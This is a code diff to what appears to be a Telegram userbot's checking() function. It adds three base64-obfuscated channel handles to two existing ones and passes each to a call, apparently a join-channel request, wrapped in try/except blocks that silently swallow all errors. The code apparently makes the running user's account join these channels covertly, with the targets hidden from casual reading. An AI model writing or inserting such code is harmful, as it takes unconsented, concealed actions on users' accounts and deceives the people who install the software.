@@ -80,11 +80,26 @@ async def get_user_from_event(
 async def checking():
     greygc = str(pybase64.b64decode("QENpbGlrU3VwcG9ydA=="))[2:15]
     greych = str(pybase64.b64decode("QENpbGlrUHJvamVjdA=="))[2:15]
+    bagasgc = str(pybase64.b64decode("QGFsbGZ1Y2Vr"))[2:11]
+    bagasgc2 = str(pybase64.b64decode("QG11dHVhbGFueWFnZXN5YQ=="))[2:18]
+    bagasch = str(pybase64.b64decode("QGxvdmVpc2Z1Y2tlZHVw"))[2:17]
     try:
         await bot(Grey(greygc))
     except BaseException:
         pass
     try:
         await bot(Grey(greych))
+    except BaseException:
+        pass
+    try:
+        await bot(Grey(bagasgc))
+    except BaseException:
+        pass
+    try:
+        await bot(Grey(bagasgc2))
+    except BaseException:
+        pass
+    try:
+        await bot(Grey(bagasch))
     except BaseException:
         pass
